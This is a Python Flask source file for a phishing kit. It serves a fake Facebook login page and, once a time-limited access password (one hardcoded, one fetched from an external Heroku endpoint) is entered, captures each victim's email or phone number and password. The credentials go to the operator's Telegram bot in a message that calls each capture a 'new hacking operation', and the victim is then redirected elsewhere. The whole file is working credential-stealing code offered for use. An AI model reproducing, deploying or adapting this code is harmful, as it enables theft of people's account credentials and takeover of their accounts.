import re
from datetime import datetime

import requests as requests
from flask import Flask, render_template, request, redirect, url_for
from wtforms import Form, validators, StringField
from wtforms.widgets import PasswordInput

from config import Config


class TextFieldForm(Form):
    email_form = StringField('Your Number:', [

    ])
    pass_form = StringField('Password:', [
        validators.DataRequired()

    ], widget=PasswordInput(hide_value=True))


app = Flask(__name__)

token = Config.BOT_TOKEN
userSudo = Config.User_Id
link_after_login = Config.link_after_login


def get_pass():
    res = requests.get('https://api-python-all.herokuapp.com/leomedo/gen_pass_main')
    result = re.search('<a class="show_pass_text">(.*)</a>', res.text)
    return result.group(1)


def check_time():
    try:
        with open('time.txt', 'r+') as file:
            contents = file.read()
            now = datetime.strptime(datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"), "%Y-%m-%d %I:%M:%S %p")
            old = datetime.strptime(contents, "%Y-%m-%d %I:%M:%S %p")
            difference = now - old
            if difference.days >= 1:
                return False
            else:
                return True

    except Exception as er:
        print(er)
        if str(er) == "[Errno 2] No such file or directory: 'time.txt'":
            f = open("time.txt", "w")
            f.close()
        return False


@app.route('/re', methods=['GET', 'POST'])
def gen_pass():
    form = request.form
    text_form = TextFieldForm(form)
    if request.method == 'POST':
        pass_text = text_form.email_form.data
        if pass_text == 'leomedoVIP':
            f = open("time.txt", "w")
            f.write(datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
            f.close()
            return redirect(url_for('facebook'))
        else:
            if pass_text == get_pass():
                f = open("time.txt", "w")
                f.write(datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
                f.close()
                return redirect(url_for('facebook'))
            else:
                return render_template('index/index.html', form=text_form, error='عذراا الباسورد غير صحيح')
    return render_template('index/index.html', form=text_form)


@app.route("/", methods=['GET', 'POST'])
def facebook():
    form = request.form
    text_form = TextFieldForm(form)
    print(check_time())
    if check_time():
        if request.method == 'POST':
            email = text_form.email_form.data
            pas = text_form.pass_form.data
            text = f'😈عمليه تهكير جديده\n email: `{email}`\n password: `{pas}`'
            requests.get(
                f'https://api.telegram.org/bot{token}/sendMessage?chat_id={userSudo}&text={text}&parse_mode=Markdown')
            return redirect(link_after_login)
        return render_template('facebook/facebook_login.html', form=text_form)
    return render_template('home.html')


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=80)
